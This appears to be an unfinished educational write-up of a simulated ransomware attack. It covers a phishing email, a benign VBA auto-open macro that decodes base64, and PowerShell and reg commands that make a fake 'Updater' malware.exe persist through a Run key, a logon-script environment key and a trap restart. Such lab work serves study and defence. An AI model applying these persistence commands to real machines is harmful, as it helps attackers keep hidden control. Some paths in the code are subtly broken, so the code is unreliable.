# Forensic Evidence Artefacts

## Overview

This document catalogues the forensic evidence collected and analysed during the investigation at each phase of the Ransomware as deemed necessary. It will include both sides of the attack, from the forensic examiner's and the attacker's points of view, to establish a complete simulation of what occurs during this attack.

## Digital Evidence

### 1. Email and VBA macros

#### Artefacts Collected

- Original Email Message
  - Evidence highlights the social engineering tactics used on the sender. The sender is not from the official security email address that many companies would have. There is a threat within the text of account termination, creating fear and a deadline for the user to act upon. There is also a grammatical error ("WIng"). This is a common feature within most phishing scams.

<img width="3840" height="2160" alt="email" src="https://github.com/user-attachments/assets/4f77841c-7003-4339-860a-a44b675ded80" />


- Attachment Files
  - The image below shows a message box that appeared upon opening the document, alerting the user to the attack. In an unsimulated circumstance, this would not appear; instead, it would run malicious code in the background.

<img width="3840" height="2160" alt="initalattack" src="https://github.com/user-attachments/assets/811ebd7f-3380-4f8f-9371-e893405725f1" />

- Obfuscated Code
   - Below shows another output that was automatic upon opening the document. This was an obfuscated string that would be untraceable and unreadable. In real-world scenarios, after being translated, there would not be a pop-up; instead, it would give the malicious actor access to the secured network.

<img width="3840" height="2160" alt="malware" src="https://github.com/user-attachments/assets/2f76c252-deae-47cb-9c58-c651da4152a9" />

#### VBA Code
```
Option Explicit 'catches logical errors

Function Base64Decode(base64string As String) As String 'function to decode obfuscated code
    Dim xmlObj As Object
    Set xmlObj = CreateObject("MSXML2.DOMDocument.6.0") 'calls library
    Dim node As Object
    Set node = xmlObj.createElement("tmp") 'extracts the object
    node.DataType = "bin.base64"
    node.Text = base64string
    Dim byteData() As Byte
    byteData = node.nodeTypedValue 'changes data type to byte
    
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2 'adTypeText
    stream.Mode = 3 'adModeReadWrite
    stream.Open
    stream.WriteText StrConv(byteData, vbUnicode) 'converts bytes to unicode
    stream.Position = 0 'starts at the beginning
    stream.Type = 2
    Base64Decode = stream.ReadText 'returns decoded string to procedure
    stream.Close
    
End Function

Sub Document_Open() 'procedure will run once document is opened
    MsgBox "This file contained malcious code. Your files are now under attack!", vbExclamation, "RANSOMWARE" 'opens a message box alerting user that the code has run
    
    Dim encoded As String
    encoded = "bWFsd2FyZQ==" '"malware" after being obfuscated in base64
    Dim decoded As String
    decoded = Base64Decode(encoded) 'calls to function
    
    MsgBox decoded
End Sub
```
### 2. System Artifacts

#### Registry Evidence

- Run Key:
  - Upon a user logging on, the malware.exe will be initiated. This will allow any processes that may have been terminated from the computer shutdown to restart. Allows for persistence in the attack and disguises itself among official Windows tools. Below is the PowerShell code:

```
$MalwarePath = "C:\Users\Public\malware.exe" #defines where the malware is stored
$RegPath = "HKCU: \Software\Microsoft\Windows\CurrentVersion\Run" #directs to the registry key
$Name = "Updater" #name of the new registry key
Set-ItemProperty -Path $RegPath -Name $Name -Value $MalwarePath
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"/v Updater /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates the new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof of new registry key in registry editor" src="https://github.com/user-attachments/assets/3fd623a1-55e2-4255-9538-32e1f03c3a1a" />

- Logoff Key:
   - Although there is no standard key for logging off, an attacker can still manipulate the environment keys, which may not take effect until after a logoff or a restart of the session. Keys in the environment will be wiped after the session ends, but having a script that runs upon logging off can inject the malicious key once again, removing its volatility. Below is the PowerShell code to add a 'logoff' key:

```
$LogoffScript = "C:\Users\Public\malware.exe" #defines where the malware is located
Set-ItemProperty —Path "HKCU:\Environment" -Name "UserInitMprLogonScript" -Value $LogoffScript
reg add "HKCU\Software\Microsoft\CurrentVersion\Logoff" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\malware.exe" /f #creates new key
```

   - To ensure the code worked, the Registry Editor was checked, see below:

<img width="3840" height="2160" alt="proof for logoff key" src="https://github.com/user-attachments/assets/e41192b9-4fb3-4b35-a19a-a79f37f7c01b" />

- Trap:
   - To ensure total persistence is achieved, the malware must be able to handle unexpected crashes and shutdowns. Below is the code that would restart the process upon meeting an unexpected situation using the Trap procedure:

```
trap #begins when an error is detected
{ Start-Process "C:\Users\Public\malware exe" #starts malware.exe process again
Continue } #continues to the next statement after the error
```

### 3. enter here
